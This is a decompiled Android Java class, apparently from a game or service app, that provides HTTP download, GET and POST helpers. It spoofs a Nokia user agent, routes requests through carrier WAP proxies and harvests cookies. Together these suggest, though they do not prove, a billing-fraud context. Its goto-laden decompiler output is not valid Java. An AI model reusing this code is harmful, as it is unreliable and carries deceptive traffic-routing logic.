// Decompiled by JEB v1.5.201408040 - http://www.android-decompiler.com

package com.agame.http;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo$State;
import com.tyj.onepiece.http.common.LogUtil;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.util.ArrayList;
import org.apache.http.Header;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.HttpVersion;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.client.params.HttpClientParams;
import org.apache.http.entity.ContentProducer;
import org.apache.http.entity.EntityTemplate;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;

public class HttpUtils {
    public ArrayList cooklist;
    private Context ctx;
    private LogUtil log;
    public static boolean passagent;
    public String refer;
    public String user_agent;

    static {
        HttpUtils.passagent = true;
    }

    public HttpUtils(Context _ctx) {
        super();
        this.log = ServiceInstance.log;
        this.user_agent = "NokiaN81";
        this.cooklist = new ArrayList();
        this.ctx = _ctx;
    }

    public int download_file(String strurl, File fd) {
        return this.download_file(strurl, fd, true);
    }

    public int download_file(String strurl, File fd, boolean needProxy) {
        byte[] v19;
        FileOutputStream v24;
        InputStream v27;
        HttpUtils v3_1;
        int v6;
        String v4;
        String v30;
        int v20;
        HttpGet v0;
        HttpResponse v31;
        this.log.trace("download url:", strurl);
        if((needProxy) && !this.iswapconnect(this.ctx)) {
            int v3 = -1;
            return v3;
        }

        HttpGet v9 = new HttpGet(strurl);
        BasicHttpParams v10 = new BasicHttpParams();
        this.get_getclient(strurl, 0, -1, false, 0, v9, ((HttpParams)v10), needProxy);
        DefaultHttpClient v26 = new DefaultHttpClient(((HttpParams)v10));
        ((HttpClient)v26).getParams().setParameter("http.protocol.version", HttpVersion.HTTP_1_1);
        String v28 = new String(strurl);
        try {
            v31 = v26.execute(((HttpUriRequest)v9));
            if(!HttpUtils.passagent) {
                v9.abort();
                this.log.trace("http download retry url:", strurl);
                v0 = new HttpGet(strurl);
            }
            else {
                goto label_245;
            }
        }
        catch(Exception v22) {
            goto label_230;
        }
        catch(ClientProtocolException v21) {
            goto label_244;
        }

        HttpGet v17 = v0;
        int v14 = -1;
        HttpUtils v11 = this;
        String v12 = strurl;
        BasicHttpParams v18 = v10;
        try {
            v11.get_getclient(v12, 0, v14, false, 0, v17, ((HttpParams)v18));
            v31 = v26.execute(v17);
            HttpUtils.passagent = true;
            goto label_68;
        }
        catch(ClientProtocolException v21) {
            goto label_199;
        }
        catch(Exception v22) {
            goto label_241;
        }

    label_245:
        v17 = v9;
        try {
            while(true) {
            label_68:
                v20 = v31.getStatusLine().getStatusCode();
                this.log.trace("get status code", v20);
                if(v20 == 302 || v20 == 303 || v20 == 307 || v20 == 301) {
                    this.getHttpCookie(v31);
                    v30 = v31.getLastHeader("Location").getValue();
                    this.log.trace("location:", v30);
                    if(v30 != null && v30.length() > 0) {
                        if(!v30.contains("http://")) {
                            v4 = String.valueOf(new URL(v28).getHost()) + v30;
                            if(!v4.contains("http://")) {
                                v4 = "http://" + v4;
                            }
                        }
                        else {
                            break;
                        }

                        goto label_131;
                    }
                }

                goto label_151;
            }
        }
        catch(ClientProtocolException v21) {
            goto label_199;
        }
        catch(Exception v22) {
            goto label_241;
        }

        v4 = v30;
        try {
        label_131:
            v17.abort();
            this.log.trace("http post 30x local url:", v4);
            v9 = new HttpGet(v4);
            v6 = -1;
            v3_1 = this;
        }
        catch(ClientProtocolException v21) {
            goto label_199;
        }
        catch(Exception v22) {
            goto label_241;
        }

        try {
            v3_1.get_getclient(v4, 0, v6, false, 1, v9, ((HttpParams)v10));
            v31 = v26.execute(((HttpUriRequest)v9));
            v28 = v4;
            v17 = v9;
            goto label_68;
        }
        catch(Exception v22) {
            goto label_230;
        }
        catch(ClientProtocolException v21) {
            goto label_244;
        }

        try {
        label_151:
            this.log.trace("status code", v20);
            if(v20 == 200) {
                if(v31.getEntity() != null) {
                    if(fd.exists()) {
                        fd.delete();
                    }

                    fd.createNewFile();
                    v27 = v31.getEntity().getContent();
                    v24 = new FileOutputStream(fd);
                    v19 = new byte[512];
                    goto label_180;
                }

                this.log.trace("http", "entity null");
                v9 = v17;
                goto label_205;
            }

            this.log.trace("http", "error code :" + v20);
            return -1;
        }
        catch(ClientProtocolException v21) {
            goto label_199;
        }
        catch(Exception v22) {
            goto label_241;
        }

    label_244:
        goto label_200;
        try {
            while(true) {
            label_180:
                int v29 = v27.read(v19);
                if(v29 <= 0) {
                    break;
                }

                v24.write(v19, 0, v29);
            }

            v24.flush();
            v24.close();
            v27.close();
            if(!v17.isAborted()) {
                v17.abort();
            }

            return 0;
        }
        catch(Exception v22) {
        label_241:
            v9 = v17;
        }
        catch(ClientProtocolException v21) {
        label_199:
            v9 = v17;
        label_200:
            this.log.trace("ClientProtocolException", v21.toString());
            goto label_205;
        }

    label_230:
        this.log.trace("Exception", v22.toString());
        this.log.logException(v22);
    label_205:
        if(!v9.isAborted()) {
            v9.abort();
        }

        return -1;
    }

    private void getHttpCookie(HttpResponse response) {
        Header[] v1 = response.getHeaders("Set-Cookie");
        int v2;
        for(v2 = 0; v2 < v1.length; ++v2) {
            String v0 = v1[v2].getValue();
            this.cooklist.add(v0);
            this.log.trace("set-cookie", v0);
        }
    }

    private void get_getclient(String strurl, int begin, int end, boolean rf, int cks, HttpGet get, HttpParams params) {
        this.get_getclient(strurl, begin, end, rf, cks, get, params, true);
    }

    private void get_getclient(String strurl, int begin, int end, boolean rf, int cks, HttpGet get, HttpParams params, boolean needProxy) {
        HttpConnectionParams.setConnectionTimeout(params, 180000);
        HttpConnectionParams.setSoTimeout(params, 180000);
        if(needProxy) {
            if(MouaService.ischinatel == 1) {
                this.log.trace("apn", "dianxin");
                params.setParameter("http.route.default-proxy", new HttpHost("10.0.0.200", 80, "http"));
            }
            else {
                this.log.trace("apn", "yidong");
                params.setParameter("http.route.default-proxy", new HttpHost("10.0.0.172", 80, "http"));
            }
        }

        HttpClientParams.setRedirecting(params, false);
        this.log.trace("get ua:", this.user_agent);
        if(this.user_agent != null && this.user_agent.length() > 0) {
            HttpProtocolParams.setUserAgent(params, this.user_agent);
        }

        get.setHeader("Accept-Charset", "iso-8859-1, utf-8; q=0.7, *; q=0.7");
        if(end >= begin) {
            get.setHeader("Range", "bytes=" + begin + "-" + end);
        }

        if(cks > 0) {
            int v0 = this.cooklist.size();
            int v1;
            for(v1 = 0; v1 < v0; ++v1) {
                Object v2 = this.cooklist.get(v1);
                if(v2 != null && ((String)v2).length() > 0) {
                    this.log.trace("Cookie", ((String)v2));
                    get.addHeader("Cookie", ((String)v2));
                }
            }
        }

        if((rf) && this.refer != null && this.refer.length() != 0) {
            get.setHeader("Referer", this.refer);
        }

        get.setHeader("Connection", "Keep-Alive");
    }

    private void get_postclient(String strurl, byte[] buffer, String contenttype, int begin, int end, boolean rf, int cks, HttpPost post, HttpParams params) {
        HttpConnectionParams.setConnectionTimeout(params, 180000);
        HttpConnectionParams.setSoTimeout(params, 180000);
        HttpConnectionParams.setSocketBufferSize(params, 8192);
        HttpClientParams.setRedirecting(params, false);
        if(MouaService.ischinatel == 1) {
            this.log.trace("apn", "dianxin");
            params.setParameter("http.route.default-proxy", new HttpHost("10.0.0.200", 80, "http"));
        }
        else {
            this.log.trace("apn", "yidong");
            params.setParameter("http.route.default-proxy", new HttpHost("10.0.0.172", 80, "http"));
        }

        this.log.trace("get ua:", this.user_agent);
        if(this.user_agent != null && this.user_agent.length() > 0) {
            HttpProtocolParams.setUserAgent(params, this.user_agent);
        }

        if(contenttype.contains("post900")) {
            this.log.trace("contenttype", "post900");
            post.setHeader("Accept", "*/*, application/vnd.wap.mms-message, application/vnd.wap.sic");
            post.setHeader("Accept-Charset", "iso-8859-1, utf-8; q=0.7, *; q=0.7");
            post.setHeader("Content-Type ", "text/plain");
        }
        else {
            post.setHeader("Accept", "text/html, application/vnd.wap.xhtml+xml, application/xhtml+xml, text/css, multipart/mixed, text/vnd.wap.wml, application/vnd.wap.wmlc, application/vnd.wap.wmlscriptc, application/java-archive, application/java, application/x-java-archive, text/vnd.sun.j2me.app-descriptor, application/vnd.oma.drm.message, application/vnd.oma.drm.content, application/vnd.wap.mms-message, application/vnd.wap.sic, text/x-co-desc, application/vnd.oma.dd+xml, text/javascript, */*, text/x-vcard, text/x-vcalendar, image/gif, image/vnd.wap.wbmp");
            post.setHeader("Accept-Charset", "iso-8859-1, utf-8, iso-10646-ucs-2; q=0.6");
            post.setHeader("Content-Type ", "application/x-www-form-urlencoded");
        }

        if(end >= begin) {
            post.setHeader("Range", "bytes=" + begin + "-" + end);
        }

        if(cks > 0) {
            int v2 = this.cooklist.size();
            int v4;
            for(v4 = 0; v4 < v2; ++v4) {
                Object v5 = this.cooklist.get(v4);
                if(v5 != null && ((String)v5).length() > 0) {
                    this.log.trace("Cookie", ((String)v5));
                    post.addHeader("Cookie", ((String)v5));
                }
            }
        }

        if((rf) && this.refer != null && this.refer.length() != 0) {
            post.setHeader("Referer", this.refer);
        }

        post.setHeader("Connection", "close");
        if(buffer != null) {
            post.setEntity(new EntityTemplate(new ContentProducer() {
                public void writeTo(OutputStream outstream) throws IOException {
                    DataOutputStream v0 = new DataOutputStream(outstream);
                    v0.write(this.val$buffer);
                    v0.flush();
                    v0.close();
                }
            }));
        }
    }

    public byte[] httpgetbyte(String strurl, int begin, int end, boolean rf, int cks) {
        return this.httpgetbyte(strurl, begin, end, rf, cks, true);
    }

    public byte[] httpgetbyte(String strurl, int begin, int end, boolean rf, int cks, boolean needWap) {
        Object v22_1;
        byte[] v20;
        ByteArrayOutputStream v19;
        InputStream v28;
        int v6;
        int v5;
        HttpUtils v3;
        String v4;
        String v31;
        HttpGet v0;
        HttpResponse v32;
        byte[] v22;
        this.log.trace("http get url:", strurl);
        if((needWap) && !this.iswapconnect(this.ctx)) {
            v22 = null;
            goto label_13;
        }

        HttpGet v9 = new HttpGet(strurl);
        BasicHttpParams v10 = new BasicHttpParams();
        if(needWap) {
            this.get_getclient(strurl, begin, end, rf, cks, v9, ((HttpParams)v10));
        }
        else {
            this.get_getclient(strurl, begin, end, rf, cks, v9, ((HttpParams)v10), false);
        }

        DefaultHttpClient v27 = new DefaultHttpClient(((HttpParams)v10));
        ((HttpClient)v27).getParams().setParameter("http.protocol.version", HttpVersion.HTTP_1_1);
        String v29 = new String(strurl);
        try {
            v32 = v27.execute(((HttpUriRequest)v9));
            if(!HttpUtils.passagent) {
                v9.abort();
                this.log.trace("http get retry url:", strurl);
                v0 = new HttpGet(strurl);
            }
            else {
                goto label_231;
            }
        }
        catch(ClientProtocolException v23) {
            goto label_230;
        }
        catch(Exception v24) {
            goto label_228;
        }

        HttpGet v17 = v0;
        HttpUtils v11 = this;
        String v12 = strurl;
        int v13 = begin;
        int v14 = end;
        boolean v15 = rf;
        int v16 = cks;
        BasicHttpParams v18 = v10;
        try {
            v11.get_getclient(v12, v13, v14, v15, v16, v17, ((HttpParams)v18));
            v32 = v27.execute(v17);
            HttpUtils.passagent = true;
            goto label_68;
        }
        catch(ClientProtocolException v23) {
            goto label_193;
        }
        catch(Exception v24) {
            goto label_211;
        }

    label_231:
        v17 = v9;
        try {
            while(true) {
            label_68:
                int v21 = v32.getStatusLine().getStatusCode();
                this.log.trace("get status code", v21);
                if(v21 == 302 || v21 == 303 || v21 == 307 || v21 == 301) {
                    this.getHttpCookie(v32);
                    v31 = v32.getLastHeader("Location").getValue();
                    this.log.trace("location:", v31);
                    if(v31 != null && v31.length() > 0) {
                        if(!v31.contains("http://")) {
                            v4 = String.valueOf(new URL(v29).getHost()) + v31;
                            if(!v4.contains("http://")) {
                                v4 = "http://" + v4;
                            }
                        }
                        else {
                            break;
                        }

                        goto label_131;
                    }
                }

                goto label_160;
            }
        }
        catch(ClientProtocolException v23) {
            goto label_193;
        }
        catch(Exception v24) {
            goto label_211;
        }

        v4 = v31;
        try {
        label_131:
            v17.abort();
            this.log.trace("http post 30x local url:", v4);
            v9 = new HttpGet(v4);
            v3 = this;
            v5 = begin;
            v6 = end;
        }
        catch(ClientProtocolException v23) {
            goto label_193;
        }
        catch(Exception v24) {
            goto label_211;
        }

        try {
            v3.get_getclient(v4, v5, v6, false, 1, v9, ((HttpParams)v10));
            v32 = v27.execute(((HttpUriRequest)v9));
            v29 = v4;
            v17 = v9;
            goto label_68;
        }
        catch(ClientProtocolException v23) {
            goto label_230;
        }
        catch(Exception v24) {
            goto label_228;
        }

    label_160:
        if(v21 != 200 && v21 != 206) {
            v22 = null;
            goto label_13;
        }

        try {
            this.getHttpCookie(v32);
            if(v32.getEntity() != null) {
                v28 = v32.getEntity().getContent();
                v19 = new ByteArrayOutputStream();
                v20 = new byte[1024];
                goto label_179;
            }

            this.log.trace("http", "entity null");
            v9 = v17;
            goto label_199;
        }
        catch(ClientProtocolException v23) {
            goto label_193;
        }
        catch(Exception v24) {
            goto label_211;
        }

    label_230:
        goto label_194;
    label_228:
        goto label_212;
        try {
            while(true) {
            label_179:
                int v30 = v28.read(v20);
                if(v30 <= 0) {
                    break;
                }

                v19.write(v20, 0, v30);
            }

            v19.flush();
            v19.close();
            v22_1 = v19.toByteArray().clone();
            v28.close();
            if(v17.isAborted()) {
                goto label_13;
            }

            v17.abort();
            goto label_13;
        }
        catch(Exception v24) {
        label_211:
            v9 = v17;
        }
        catch(ClientProtocolException v23) {
        label_193:
            v9 = v17;
        label_194:
            this.log.trace("ClientProtocolException", v23.toString());
            goto label_199;
        }

    label_212:
        this.log.trace("Exception", v24.toString());
    label_199:
        if(!v9.isAborted()) {
            v9.abort();
        }

        v22 = null;
    label_13:
        return ((byte[])v22_1);
    }

    public byte[] httppostbyte(String strurl, byte[] buffer, String contenttype, int begin, int end, boolean rf, int cks) {
        Object v26_1;
        byte[] v24;
        ByteArrayOutputStream v23;
        InputStream v32;
        int v8;
        int v7;
        String v6;
        byte[] v5;
        HttpUtils v3;
        String v4;
        String v35;
        HttpPost v0;
        HttpResponse v36;
        byte[] v26;
        this.log.trace("http post url:", strurl);
        if(!this.iswapconnect(this.ctx)) {
            v26 = null;
            goto label_11;
        }

        HttpPost v11 = new HttpPost(strurl);
        BasicHttpParams v12 = new BasicHttpParams();
        this.get_postclient(strurl, buffer, contenttype, begin, end, rf, cks, v11, ((HttpParams)v12));
        DefaultHttpClient v31 = new DefaultHttpClient(((HttpParams)v12));
        v31.getParams().setParameter("http.protocol.version", HttpVersion.HTTP_1_1);
        String v33 = new String(strurl);
        try {
            v36 = v31.execute(((HttpUriRequest)v11));
            if(!HttpUtils.passagent) {
                v11.abort();
                this.log.trace("http get retry url:", strurl);
                v0 = new HttpPost(strurl);
            }
            else {
                goto label_227;
            }
        }
        catch(Exception v28) {
            goto label_224;
        }
        catch(ClientProtocolException v27) {
            goto label_226;
        }

        HttpPost v21 = v0;
        HttpUtils v13 = this;
        String v14 = strurl;
        byte[] v15 = buffer;
        String v16 = contenttype;
        int v17 = begin;
        int v18 = end;
        boolean v19 = rf;
        int v20 = cks;
        BasicHttpParams v22 = v12;
        try {
            v13.get_postclient(v14, v15, v16, v17, v18, v19, v20, v21, ((HttpParams)v22));
            v36 = v31.execute(v21);
            HttpUtils.passagent = true;
            goto label_71;
        }
        catch(Exception v28) {
            goto label_207;
        }
        catch(ClientProtocolException v27) {
            goto label_189;
        }

    label_227:
        v21 = v11;
        try {
            while(true) {
            label_71:
                int v25 = v36.getStatusLine().getStatusCode();
                this.log.trace("post status code", v25);
                if(v25 == 302 || v25 == 303 || v25 == 307 || v25 == 301) {
                    this.getHttpCookie(v36);
                    v35 = v36.getLastHeader("Location").getValue();
                    this.log.trace("location:", v35);
                    if(v35 != null && v35.length() > 0) {
                        if(!v35.contains("http://")) {
                            v4 = String.valueOf(new URL(v33).getHost()) + v35;
                            if(!v4.contains("http://")) {
                                v4 = "http://" + v4;
                            }
                        }
                        else {
                            break;
                        }

                        goto label_134;
                    }
                }

                goto label_156;
            }
        }
        catch(Exception v28) {
            goto label_207;
        }
        catch(ClientProtocolException v27) {
            goto label_189;
        }

        v4 = v35;
        try {
        label_134:
            v21.abort();
            this.log.trace("http post 30x local url:", v4);
            v11 = new HttpPost(v4);
            v3 = this;
            v5 = buffer;
            v6 = contenttype;
            v7 = begin;
            v8 = end;
        }
        catch(Exception v28) {
            goto label_207;
        }
        catch(ClientProtocolException v27) {
            goto label_189;
        }

        try {
            v3.get_postclient(v4, v5, v6, v7, v8, false, 1, v11, ((HttpParams)v12));
            v36 = v31.execute(((HttpUriRequest)v11));
            v33 = v4;
            v21 = v11;
            goto label_71;
        }
        catch(Exception v28) {
            goto label_224;
        }
        catch(ClientProtocolException v27) {
            goto label_226;
        }

    label_156:
        if(v25 != 200 && v25 != 206) {
            v26 = null;
            goto label_11;
        }

        try {
            if(v36.getEntity() != null) {
                this.getHttpCookie(v36);
                v32 = v36.getEntity().getContent();
                v23 = new ByteArrayOutputStream();
                v24 = new byte[1024];
                goto label_175;
            }

            this.log.trace("http", "entity null");
            v11 = v21;
            goto label_195;
        }
        catch(Exception v28) {
            goto label_207;
        }
        catch(ClientProtocolException v27) {
            goto label_189;
        }

    label_226:
        goto label_190;
    label_224:
        goto label_208;
        try {
            while(true) {
            label_175:
                int v34 = v32.read(v24);
                if(v34 <= 0) {
                    break;
                }

                v23.write(v24, 0, v34);
            }

            v23.flush();
            v23.close();
            v32.close();
            v26_1 = v23.toByteArray().clone();
            if(v21.isAborted()) {
                goto label_11;
            }

            v21.abort();
            goto label_11;
        }
        catch(Exception v28) {
        label_207:
            v11 = v21;
        }
        catch(ClientProtocolException v27) {
        label_189:
            v11 = v21;
        label_190:
            this.log.trace("ClientProtocolException", v27.toString());
            goto label_195;
        }

    label_208:
        this.log.trace("Exception", v28.toString());
    label_195:
        if(!v11.isAborted()) {
            v11.abort();
        }

        v26 = null;
    label_11:
        return ((byte[])v26_1);
    }

    public boolean iswapconnect(Context ctx) {
        boolean v5 = false;
        Object v0 = ctx.getSystemService("connectivity");
        NetworkInfo v4 = ((ConnectivityManager)v0).getNetworkInfo(1);
        if(v4 != null) {
            NetworkInfo$State v3 = v4.getState();
            if(v3 != NetworkInfo$State.CONNECTED && v3 != NetworkInfo$State.CONNECTING) {
                goto label_16;
            }

            this.log.trace("wifi", "is opened");
        }
        else {
        label_16:
            NetworkInfo v2 = ((ConnectivityManager)v0).getNetworkInfo(0);
            if(v2 != null && (v2.isAvailable())) {
                this.log.trace(" wap apn", "used");
                String v1 = v2.getExtraInfo();
                if(v1 != null) {
                    this.log.trace("current apn", v1);
                    if((v1.contains("net")) && !MouaService.isIcs) {
                        this.log.trace("apn", "360 error");
                        return v5;
                    }
                }
                else {
                    this.log.trace("current apn", "null");
                }

                return true;
            }

            this.log.trace("apn", "can not used");
        }

        return v5;
    }
}

